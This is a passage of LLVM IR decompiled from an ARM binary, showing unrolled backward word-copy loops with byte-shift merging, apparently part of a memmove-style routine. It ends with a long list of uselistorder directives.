  store i1 %v8_17a90, i1* %cpsr_z.global-to-local, align 1
  %v5_17a94 = icmp slt i32 %v2_17a84, -12
  br i1 %v5_17a94, label %dec_label_pc_17ab0, label %dec_label_pc_17a98

dec_label_pc_17a98:                               ; preds = %dec_label_pc_17a8c, %dec_label_pc_17a4c, %dec_label_pc_17a98
  %v1_17aa4 = phi i32 [ %v5_17aa4, %dec_label_pc_17a98 ], [ %v1_17a80, %dec_label_pc_17a8c ], [ %v0_17a8019, %dec_label_pc_17a4c ]
  %v0_17a98 = load i32, i32* @r3, align 4
  %v3_17a98 = mul i32 %v0_17a98, 256
  store i32 %v3_17a98, i32* %ip.global-to-local, align 4
  %v0_17a9c = load i32, i32* %r1.global-to-local, align 4
  %v1_17a9c = add i32 %v0_17a9c, -4
  %v2_17a9c = inttoptr i32 %v1_17a9c to i32*
  %v3_17a9c = load i32, i32* %v2_17a9c, align 4
  store i32 %v3_17a9c, i32* @r3, align 4
  store i32 %v1_17a9c, i32* %r1.global-to-local, align 4
  %v4_17aa0 = udiv i32 %v3_17a9c, 16777216
  %v5_17aa0 = or i32 %v4_17aa0, %v3_17a98
  store i32 %v5_17aa0, i32* @ip, align 4
  %v2_17aa4 = add i32 %v1_17aa4, -4
  %v3_17aa4 = inttoptr i32 %v2_17aa4 to i32*
  store i32 %v5_17aa0, i32* %v3_17aa4, align 4
  %v4_17aa4 = load i32, i32* %r0.global-to-local, align 4
  %v5_17aa4 = add i32 %v4_17aa4, -4
  store i32 %v5_17aa4, i32* %r0.global-to-local, align 4
  %v0_17aa8 = load i32, i32* %r2.global-to-local, align 4
  %v2_17aa8 = add i32 %v0_17aa8, -4
  store i32 %v2_17aa8, i32* %r2.global-to-local, align 4
  %v6_17aac = icmp slt i32 %v0_17aa8, 4
  br i1 %v6_17aac, label %dec_label_pc_17ab0.loopexit, label %dec_label_pc_17a98

dec_label_pc_17ab0.loopexit:                      ; preds = %dec_label_pc_17a98
  %v4_17aa8 = sub i32 3, %v0_17aa8
  %v5_17aa8 = and i32 %v4_17aa8, %v0_17aa8
  %v6_17aa8 = icmp slt i32 %v5_17aa8, 0
  %v7_17aa8 = icmp slt i32 %v2_17aa8, 0
  store i1 %v6_17aa8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17aa8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17ab0

dec_label_pc_17ab0:                               ; preds = %dec_label_pc_17ab0.loopexit, %dec_label_pc_17a8c
  %v2_179f451 = phi i32 [ %v5_17aa4, %dec_label_pc_17ab0.loopexit ], [ %v1_17a80, %dec_label_pc_17a8c ]
  %v0_179e447 = phi i32 [ %v2_17aa8, %dec_label_pc_17ab0.loopexit ], [ %v2_17a90, %dec_label_pc_17a8c ]
  %v0_17ab0 = load i32, i32* %r1.global-to-local, align 4
  %v1_17ab0 = add i32 %v0_17ab0, 3
  store i32 %v1_17ab0, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_17ab8:                               ; preds = %dec_label_pc_17a48
  br i1 %v5_17b28, label %dec_label_pc_17b04, label %dec_label_pc_17ac0

dec_label_pc_17ac0:                               ; preds = %dec_label_pc_17ab8
  store i32 %v2_17b24, i32* %r2.global-to-local, align 4
  %v3_17ac4 = load i32, i32* @r4, align 4
  store i32 %v3_17ac4, i32* %stack_var_-12, align 4
  %v6_17ac4 = load i32, i32* @r5, align 4
  %v8_17ac4 = inttoptr i32 %v6_17ac4 to i8*
  store i8* %v8_17ac4, i8** %stack_var_-8, align 4
  %v11_17ac4 = load i32, i32* @lr, align 4
  br label %dec_label_pc_17ac8

dec_label_pc_17ac8:                               ; preds = %dec_label_pc_17ac8.dec_label_pc_17ac8_crit_edge, %dec_label_pc_17ac0
  %v0_17aec = phi i32 [ %v1_17aec, %dec_label_pc_17ac8.dec_label_pc_17ac8_crit_edge ], [ %v0_17a8019, %dec_label_pc_17ac0 ]
  %v0_17acc = phi i32 [ %v0_17acc.pre, %dec_label_pc_17ac8.dec_label_pc_17ac8_crit_edge ], [ %v1_17a38, %dec_label_pc_17ac0 ]
  %v0_17ac8 = phi i32 [ %v0_17ac8.pre, %dec_label_pc_17ac8.dec_label_pc_17ac8_crit_edge ], [ %v2_17a3c, %dec_label_pc_17ac0 ]
  %v3_17ac8 = mul i32 %v0_17ac8, 65536
  store i32 %v3_17ac8, i32* %lr.global-to-local, align 4
  %v1_17acc = add i32 %v0_17acc, -4
  %v2_17acc = inttoptr i32 %v1_17acc to i32*
  %v3_17acc = load i32, i32* %v2_17acc, align 4
  store i32 %v3_17acc, i32* @r3, align 4
  %v4_17acc = add i32 %v0_17acc, -8
  %v5_17acc = inttoptr i32 %v4_17acc to i32*
  %v6_17acc = load i32, i32* %v5_17acc, align 4
  store i32 %v6_17acc, i32* %r4.global-to-local, align 4
  %v7_17acc = add i32 %v0_17acc, -12
  %v8_17acc = inttoptr i32 %v7_17acc to i32*
  %v9_17acc = load i32, i32* %v8_17acc, align 4
  store i32 %v9_17acc, i32* %r5.global-to-local, align 4
  %v10_17acc = add i32 %v0_17acc, -16
  %v11_17acc = inttoptr i32 %v10_17acc to i32*
  %v12_17acc = load i32, i32* %v11_17acc, align 4
  store i32 %v10_17acc, i32* %r1.global-to-local, align 4
  %v4_17ad0 = udiv i32 %v12_17acc, 65536
  %v5_17ad0 = or i32 %v4_17ad0, %v3_17ac8
  store i32 %v5_17ad0, i32* %lr.global-to-local, align 4
  %v3_17ad4 = mul i32 %v12_17acc, 65536
  %v4_17ad8 = udiv i32 %v9_17acc, 65536
  %v5_17ad8 = or i32 %v3_17ad4, %v4_17ad8
  store i32 %v5_17ad8, i32* @ip, align 4
  %v3_17adc = mul i32 %v9_17acc, 65536
  %v4_17ae0 = udiv i32 %v6_17acc, 65536
  %v5_17ae0 = or i32 %v3_17adc, %v4_17ae0
  store i32 %v5_17ae0, i32* %r5.global-to-local, align 4
  %v3_17ae4 = mul i32 %v6_17acc, 65536
  %v4_17ae8 = udiv i32 %v3_17acc, 65536
  %v5_17ae8 = or i32 %v3_17ae4, %v4_17ae8
  store i32 %v5_17ae8, i32* %r4.global-to-local, align 4
  %v1_17aec = add i32 %v0_17aec, -16
  %v2_17aec = inttoptr i32 %v1_17aec to i32*
  store i32 %v5_17ae8, i32* %v2_17aec, align 4
  %v4_17aec = add i32 %v0_17aec, -12
  %v5_17aec = inttoptr i32 %v4_17aec to i32*
  %v6_17aec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17aec, i32* %v5_17aec, align 4
  %v7_17aec = add i32 %v0_17aec, -8
  %v8_17aec = inttoptr i32 %v7_17aec to i32*
  %v9_17aec = load i32, i32* @ip, align 4
  store i32 %v9_17aec, i32* %v8_17aec, align 4
  %v10_17aec = add i32 %v0_17aec, -4
  %v11_17aec = inttoptr i32 %v10_17aec to i32*
  %v12_17aec = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17aec, i32* %v11_17aec, align 4
  store i32 %v1_17aec, i32* %r0.global-to-local, align 4
  %v0_17af0 = load i32, i32* %r2.global-to-local, align 4
  %v2_17af0 = add i32 %v0_17af0, -16
  store i32 %v2_17af0, i32* %r2.global-to-local, align 4
  %v6_17af4 = icmp slt i32 %v0_17af0, 16
  br i1 %v6_17af4, label %dec_label_pc_17af8, label %dec_label_pc_17ac8.dec_label_pc_17ac8_crit_edge

dec_label_pc_17ac8.dec_label_pc_17ac8_crit_edge:  ; preds = %dec_label_pc_17ac8
  %v0_17ac8.pre = load i32, i32* @r3, align 4
  %v0_17acc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17ac8

dec_label_pc_17af8:                               ; preds = %dec_label_pc_17ac8
  %v2_17af8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17af8, i32* @r4, align 4
  %v5_17af8 = load i8*, i8** %stack_var_-8, align 4
  %v6_17af8 = ptrtoint i8* %v5_17af8 to i32
  store i32 %v6_17af8, i32* @r5, align 4
  store i32 %v11_17ac4, i32* @lr, align 4
  %v2_17afc = add i32 %v0_17af0, -4
  store i32 %v2_17afc, i32* %r2.global-to-local, align 4
  %v4_17afc = add i32 %v0_17af0, 2147483632
  %v5_17afc = and i32 %v2_17afc, %v4_17afc
  %v6_17afc = icmp slt i32 %v5_17afc, 0
  store i1 %v6_17afc, i1* %cpsr_v.global-to-local, align 1
  %v7_17afc = icmp slt i32 %v2_17afc, 0
  store i1 %v7_17afc, i1* %cpsr_n.global-to-local, align 1
  %v8_17afc = icmp eq i32 %v2_17afc, 0
  store i1 %v8_17afc, i1* %cpsr_z.global-to-local, align 1
  %v5_17b00 = icmp slt i32 %v2_17af0, -12
  br i1 %v5_17b00, label %dec_label_pc_17b1c, label %dec_label_pc_17b04

dec_label_pc_17b04:                               ; preds = %dec_label_pc_17af8, %dec_label_pc_17ab8, %dec_label_pc_17b04
  %v1_17b10 = phi i32 [ %v5_17b10, %dec_label_pc_17b04 ], [ %v1_17aec, %dec_label_pc_17af8 ], [ %v0_17a8019, %dec_label_pc_17ab8 ]
  %v0_17b04 = load i32, i32* @r3, align 4
  %v3_17b04 = mul i32 %v0_17b04, 65536
  store i32 %v3_17b04, i32* %ip.global-to-local, align 4
  %v0_17b08 = load i32, i32* %r1.global-to-local, align 4
  %v1_17b08 = add i32 %v0_17b08, -4
  %v2_17b08 = inttoptr i32 %v1_17b08 to i32*
  %v3_17b08 = load i32, i32* %v2_17b08, align 4
  store i32 %v3_17b08, i32* @r3, align 4
  store i32 %v1_17b08, i32* %r1.global-to-local, align 4
  %v4_17b0c = udiv i32 %v3_17b08, 65536
  %v5_17b0c = or i32 %v4_17b0c, %v3_17b04
  store i32 %v5_17b0c, i32* @ip, align 4
  %v2_17b10 = add i32 %v1_17b10, -4
  %v3_17b10 = inttoptr i32 %v2_17b10 to i32*
  store i32 %v5_17b0c, i32* %v3_17b10, align 4
  %v4_17b10 = load i32, i32* %r0.global-to-local, align 4
  %v5_17b10 = add i32 %v4_17b10, -4
  store i32 %v5_17b10, i32* %r0.global-to-local, align 4
  %v0_17b14 = load i32, i32* %r2.global-to-local, align 4
  %v2_17b14 = add i32 %v0_17b14, -4
  store i32 %v2_17b14, i32* %r2.global-to-local, align 4
  %v6_17b18 = icmp slt i32 %v0_17b14, 4
  br i1 %v6_17b18, label %dec_label_pc_17b1c.loopexit, label %dec_label_pc_17b04

dec_label_pc_17b1c.loopexit:                      ; preds = %dec_label_pc_17b04
  %v4_17b14 = sub i32 3, %v0_17b14
  %v5_17b14 = and i32 %v4_17b14, %v0_17b14
  %v6_17b14 = icmp slt i32 %v5_17b14, 0
  %v7_17b14 = icmp slt i32 %v2_17b14, 0
  store i1 %v6_17b14, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17b14, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17b1c

dec_label_pc_17b1c:                               ; preds = %dec_label_pc_17b1c.loopexit, %dec_label_pc_17af8
  %v2_179f452 = phi i32 [ %v5_17b10, %dec_label_pc_17b1c.loopexit ], [ %v1_17aec, %dec_label_pc_17af8 ]
  %v0_179e448 = phi i32 [ %v2_17b14, %dec_label_pc_17b1c.loopexit ], [ %v2_17afc, %dec_label_pc_17af8 ]
  %v0_17b1c = load i32, i32* %r1.global-to-local, align 4
  %v1_17b1c = add i32 %v0_17b1c, 2
  store i32 %v1_17b1c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_17b24:                               ; preds = %dec_label_pc_17a38
  br i1 %v5_17b28, label %dec_label_pc_17b70, label %dec_label_pc_17b2c

dec_label_pc_17b2c:                               ; preds = %dec_label_pc_17b24
  store i32 %v2_17b24, i32* %r2.global-to-local, align 4
  %v3_17b30 = load i32, i32* @r4, align 4
  store i32 %v3_17b30, i32* %stack_var_-12, align 4
  %v6_17b30 = load i32, i32* @r5, align 4
  %v8_17b30 = inttoptr i32 %v6_17b30 to i8*
  store i8* %v8_17b30, i8** %stack_var_-8, align 4
  %v11_17b30 = load i32, i32* @lr, align 4
  br label %dec_label_pc_17b34

dec_label_pc_17b34:                               ; preds = %dec_label_pc_17b34.dec_label_pc_17b34_crit_edge, %dec_label_pc_17b2c
  %v0_17b58 = phi i32 [ %v1_17b58, %dec_label_pc_17b34.dec_label_pc_17b34_crit_edge ], [ %v0_17a8019, %dec_label_pc_17b2c ]
  %v0_17b38 = phi i32 [ %v0_17b38.pre, %dec_label_pc_17b34.dec_label_pc_17b34_crit_edge ], [ %v1_17a38, %dec_label_pc_17b2c ]
  %v0_17b34 = phi i32 [ %v0_17b34.pre, %dec_label_pc_17b34.dec_label_pc_17b34_crit_edge ], [ %v2_17a3c, %dec_label_pc_17b2c ]
  %v3_17b34 = mul i32 %v0_17b34, 16777216
  store i32 %v3_17b34, i32* %lr.global-to-local, align 4
  %v1_17b38 = add i32 %v0_17b38, -4
  %v2_17b38 = inttoptr i32 %v1_17b38 to i32*
  %v3_17b38 = load i32, i32* %v2_17b38, align 4
  store i32 %v3_17b38, i32* @r3, align 4
  %v4_17b38 = add i32 %v0_17b38, -8
  %v5_17b38 = inttoptr i32 %v4_17b38 to i32*
  %v6_17b38 = load i32, i32* %v5_17b38, align 4
  store i32 %v6_17b38, i32* %r4.global-to-local, align 4
  %v7_17b38 = add i32 %v0_17b38, -12
  %v8_17b38 = inttoptr i32 %v7_17b38 to i32*
  %v9_17b38 = load i32, i32* %v8_17b38, align 4
  store i32 %v9_17b38, i32* %r5.global-to-local, align 4
  %v10_17b38 = add i32 %v0_17b38, -16
  %v11_17b38 = inttoptr i32 %v10_17b38 to i32*
  %v12_17b38 = load i32, i32* %v11_17b38, align 4
  store i32 %v10_17b38, i32* %r1.global-to-local, align 4
  %v4_17b3c = udiv i32 %v12_17b38, 256
  %v5_17b3c = or i32 %v4_17b3c, %v3_17b34
  store i32 %v5_17b3c, i32* %lr.global-to-local, align 4
  %v3_17b40 = mul i32 %v12_17b38, 16777216
  %v4_17b44 = udiv i32 %v9_17b38, 256
  %v5_17b44 = or i32 %v3_17b40, %v4_17b44
  store i32 %v5_17b44, i32* @ip, align 4
  %v3_17b48 = mul i32 %v9_17b38, 16777216
  %v4_17b4c = udiv i32 %v6_17b38, 256
  %v5_17b4c = or i32 %v3_17b48, %v4_17b4c
  store i32 %v5_17b4c, i32* %r5.global-to-local, align 4
  %v3_17b50 = mul i32 %v6_17b38, 16777216
  %v4_17b54 = udiv i32 %v3_17b38, 256
  %v5_17b54 = or i32 %v3_17b50, %v4_17b54
  store i32 %v5_17b54, i32* %r4.global-to-local, align 4
  %v1_17b58 = add i32 %v0_17b58, -16
  %v2_17b58 = inttoptr i32 %v1_17b58 to i32*
  store i32 %v5_17b54, i32* %v2_17b58, align 4
  %v4_17b58 = add i32 %v0_17b58, -12
  %v5_17b58 = inttoptr i32 %v4_17b58 to i32*
  %v6_17b58 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17b58, i32* %v5_17b58, align 4
  %v7_17b58 = add i32 %v0_17b58, -8
  %v8_17b58 = inttoptr i32 %v7_17b58 to i32*
  %v9_17b58 = load i32, i32* @ip, align 4
  store i32 %v9_17b58, i32* %v8_17b58, align 4
  %v10_17b58 = add i32 %v0_17b58, -4
  %v11_17b58 = inttoptr i32 %v10_17b58 to i32*
  %v12_17b58 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17b58, i32* %v11_17b58, align 4
  store i32 %v1_17b58, i32* %r0.global-to-local, align 4
  %v0_17b5c = load i32, i32* %r2.global-to-local, align 4
  %v2_17b5c = add i32 %v0_17b5c, -16
  store i32 %v2_17b5c, i32* %r2.global-to-local, align 4
  %v6_17b60 = icmp slt i32 %v0_17b5c, 16
  br i1 %v6_17b60, label %dec_label_pc_17b64, label %dec_label_pc_17b34.dec_label_pc_17b34_crit_edge

dec_label_pc_17b34.dec_label_pc_17b34_crit_edge:  ; preds = %dec_label_pc_17b34
  %v0_17b34.pre = load i32, i32* @r3, align 4
  %v0_17b38.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17b34

dec_label_pc_17b64:                               ; preds = %dec_label_pc_17b34
  %v2_17b64 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17b64, i32* @r4, align 4
  %v5_17b64 = load i8*, i8** %stack_var_-8, align 4
  %v6_17b64 = ptrtoint i8* %v5_17b64 to i32
  store i32 %v6_17b64, i32* @r5, align 4
  store i32 %v11_17b30, i32* @lr, align 4
  %v2_17b68 = add i32 %v0_17b5c, -4
  store i32 %v2_17b68, i32* %r2.global-to-local, align 4
  %v4_17b68 = add i32 %v0_17b5c, 2147483632
  %v5_17b68 = and i32 %v2_17b68, %v4_17b68
  %v6_17b68 = icmp slt i32 %v5_17b68, 0
  store i1 %v6_17b68, i1* %cpsr_v.global-to-local, align 1
  %v7_17b68 = icmp slt i32 %v2_17b68, 0
  store i1 %v7_17b68, i1* %cpsr_n.global-to-local, align 1
  %v8_17b68 = icmp eq i32 %v2_17b68, 0
  store i1 %v8_17b68, i1* %cpsr_z.global-to-local, align 1
  %v5_17b6c = icmp slt i32 %v2_17b5c, -12
  br i1 %v5_17b6c, label %dec_label_pc_17b88, label %dec_label_pc_17b70

dec_label_pc_17b70:                               ; preds = %dec_label_pc_17b64, %dec_label_pc_17b24, %dec_label_pc_17b70
  %v1_17b7c = phi i32 [ %v5_17b7c, %dec_label_pc_17b70 ], [ %v1_17b58, %dec_label_pc_17b64 ], [ %v0_17a8019, %dec_label_pc_17b24 ]
  %v0_17b70 = load i32, i32* @r3, align 4
  %v3_17b70 = mul i32 %v0_17b70, 16777216
  store i32 %v3_17b70, i32* %ip.global-to-local, align 4
  %v0_17b74 = load i32, i32* %r1.global-to-local, align 4
  %v1_17b74 = add i32 %v0_17b74, -4
  %v2_17b74 = inttoptr i32 %v1_17b74 to i32*
  %v3_17b74 = load i32, i32* %v2_17b74, align 4
  store i32 %v3_17b74, i32* @r3, align 4
  store i32 %v1_17b74, i32* %r1.global-to-local, align 4
  %v4_17b78 = udiv i32 %v3_17b74, 256
  %v5_17b78 = or i32 %v4_17b78, %v3_17b70
  store i32 %v5_17b78, i32* @ip, align 4
  %v2_17b7c = add i32 %v1_17b7c, -4
  %v3_17b7c = inttoptr i32 %v2_17b7c to i32*
  store i32 %v5_17b78, i32* %v3_17b7c, align 4
  %v4_17b7c = load i32, i32* %r0.global-to-local, align 4
  %v5_17b7c = add i32 %v4_17b7c, -4
  store i32 %v5_17b7c, i32* %r0.global-to-local, align 4
  %v0_17b80 = load i32, i32* %r2.global-to-local, align 4
  %v2_17b80 = add i32 %v0_17b80, -4
  store i32 %v2_17b80, i32* %r2.global-to-local, align 4
  %v6_17b84 = icmp slt i32 %v0_17b80, 4
  br i1 %v6_17b84, label %dec_label_pc_17b88.loopexit, label %dec_label_pc_17b70

dec_label_pc_17b88.loopexit:                      ; preds = %dec_label_pc_17b70
  %v4_17b80 = sub i32 3, %v0_17b80
  %v5_17b80 = and i32 %v4_17b80, %v0_17b80
  %v6_17b80 = icmp slt i32 %v5_17b80, 0
  %v7_17b80 = icmp slt i32 %v2_17b80, 0
  store i1 %v6_17b80, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17b80, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17b88

dec_label_pc_17b88:                               ; preds = %dec_label_pc_17b88.loopexit, %dec_label_pc_17b64
  %v2_179f453 = phi i32 [ %v5_17b7c, %dec_label_pc_17b88.loopexit ], [ %v1_17b58, %dec_label_pc_17b64 ]
  %v0_179e449 = phi i32 [ %v2_17b80, %dec_label_pc_17b88.loopexit ], [ %v2_17b68, %dec_label_pc_17b64 ]
  %v0_17b88 = load i32, i32* %r1.global-to-local, align 4
  %v1_17b88 = add i32 %v0_17b88, 1
  store i32 %v1_17b88, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_17b7c, { 0, 2, 1 }
  uselistorder i32 %v3_17b70, { 1, 0 }
  uselistorder i32 %v2_17b68, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17b58, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17b38, { 1, 0 }
  uselistorder i32 %v3_17b34, { 1, 0 }
  uselistorder i32 %v0_17b38, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17b58, { 3, 2, 1, 0 }
  uselistorder i32 %v5_17b10, { 0, 2, 1 }
  uselistorder i32 %v3_17b04, { 1, 0 }
  uselistorder i32 %v2_17afc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17aec, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17acc, { 1, 0 }
  uselistorder i32 %v3_17ac8, { 1, 0 }
  uselistorder i32 %v0_17acc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17aec, { 3, 2, 1, 0 }
  uselistorder i32 %v5_17aa4, { 0, 2, 1 }
  uselistorder i32 %v3_17a98, { 1, 0 }
  uselistorder i32 %v2_17a90, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17a80, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17a60, { 1, 0 }
  uselistorder i32 %v3_17a5c, { 1, 0 }
  uselistorder i32 %v0_17a60, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17a80, { 3, 2, 1, 0 }
  uselistorder i1 %v5_17b28, { 2, 0, 1 }
  uselistorder i32 %v0_17a40, { 1, 0 }
  uselistorder i32 %v0_17b2c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_17a8019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_17a30, { 2, 1, 0 }
  uselistorder i32 %v0_17a30, { 2, 0, 1 }
  uselistorder i32 %v2_17a28, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_17a28, { 1, 2, 0, 3 }
  uselistorder i32 %v0_17a28, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_17a8020, { 2, 1, 0 }
  uselistorder i32 %v11_17a04, { 1, 0 }
  uselistorder i32 %v7_17a04, { 1, 0 }
  uselistorder i32 %v1_179e4, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_179e4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_179e8, { 1, 0 }
  uselistorder i32 %v7_179dc, { 0, 2, 1 }
  uselistorder i32 %v10_179d8, { 1, 0 }
  uselistorder i32 %v9_179d0, { 1, 0, 2 }
  uselistorder i32 %v6_179cc, { 1, 0 }
  uselistorder i32 %v2_179c4, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_179c4, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_179d4, { 0, 3, 2, 1 }
  uselistorder i32 %v7_179b8, { 0, 2, 1 }
  uselistorder i32 %v13_179b4, { 1, 0 }
  uselistorder i32 %v4_179b0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_179b0, { 2, 0, 1 }
  uselistorder i32 %v6_179b8, { 0, 3, 2, 1 }
  uselistorder i32 %v7_179a8, { 0, 2, 1 }
  uselistorder i32 %v16_179a4, { 1, 0 }
  uselistorder i32 %v4_179a0, { 1, 2, 0 }
  uselistorder i32 %v0_179b0.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_179a8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_17994, { 0, 3, 2, 1 }
  uselistorder i32 %v10_17990, { 1, 0 }
  uselistorder i32 %v1_1798c, { 1, 0 }
  uselistorder i32 %v10_17988, { 1, 0 }
  uselistorder i32 %v0_17988, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1798c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_17980, { 0, 2, 1 }
  uselistorder i32 %v2_17974, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_17974, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_1798c37, { 1, 2, 0 }
  uselistorder i32 %v1_1796c, { 2, 1, 0 }
  uselistorder i32 %v1_17964, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1795c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_17958, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_17954, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_17954, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_17944, { 0, 2, 1 }
  uselistorder i32 %v4_17940, { 1, 0 }
  uselistorder i32 %v3_17934, { 1, 0 }
  uselistorder i32 %v1_1792c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17920, { 1, 0 }
  uselistorder i32 %v12_1791c, { 0, 2, 1 }
  uselistorder i32 %v8_178fc, { 1, 0, 2 }
  uselistorder i32 %v5_178fc, { 1, 0, 2 }
  uselistorder i32 %v2_178fc, { 1, 0, 2 }
  uselistorder i32 %v0_178fc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1791c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_178d8, { 0, 2, 1 }
  uselistorder i32 %v4_178d4, { 1, 0 }
  uselistorder i32 %v3_178c8, { 1, 0 }
  uselistorder i32 %v1_178c0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_178b4, { 1, 0 }
  uselistorder i32 %v12_178b0, { 0, 2, 1 }
  uselistorder i32 %v8_17890, { 1, 0, 2 }
  uselistorder i32 %v5_17890, { 1, 0, 2 }
  uselistorder i32 %v2_17890, { 1, 0, 2 }
  uselistorder i32 %v0_17890, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_178b0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1786c, { 0, 2, 1 }
  uselistorder i32 %v4_17868, { 1, 0 }
  uselistorder i32 %v3_1785c, { 1, 0 }
  uselistorder i32 %v1_17854, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17848, { 1, 0 }
  uselistorder i32 %v12_17844, { 0, 2, 1 }
  uselistorder i32 %v8_17824, { 1, 0, 2 }
  uselistorder i32 %v5_17824, { 1, 0, 2 }
  uselistorder i32 %v2_17824, { 1, 0, 2 }
  uselistorder i32 %v0_17824, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17844, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_17880, { 0, 2, 1 }
  uselistorder i32 %v1_1787c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_17800, { 2, 0, 1, 3 }
  uselistorder i32 %v2_17800, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17884, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1791c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_177f4, { 1, 0 }
  uselistorder i32 %v0_177f4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_177ec, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_177ec, { 1, 0, 2 }
  uselistorder i32 %v0_177ec, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1791c77, { 1, 0 }
  uselistorder i32 %v1_177cc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_177d4, { 1, 0 }
  uselistorder i32 %v0_177a8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1779c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_17788, { 1, 0, 2 }
  uselistorder i32 %v1_17784, { 1, 0 }
  uselistorder i32 %v1_1777c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_1777c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_17774, { 0, 2, 1 }
  uselistorder i32 %v3_17774, { 3, 0, 1, 2 }
  uselistorder i1 %v0_17774, { 1, 0 }
  uselistorder i1 %v1_17774, { 1, 0 }
  uselistorder i32 %v3_17770, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_17768, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17754, { 1, 2, 0 }
  uselistorder i32 %v1_1774c, { 0, 2, 1 }
  uselistorder i32 %v12_17748, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1773c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17740, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_17730, { 0, 2, 1 }
  uselistorder i32 %v1_17728, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_17728, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_17720, { 1, 0 }
  uselistorder i32 %v1_17718, { 2, 1, 0 }
  uselistorder i32 %v2_17710, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_17710, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1770c, { 1, 0 }
  uselistorder i32 %v2_17700, { 1, 0 }
  uselistorder i32 %v1_17700, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_17700, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
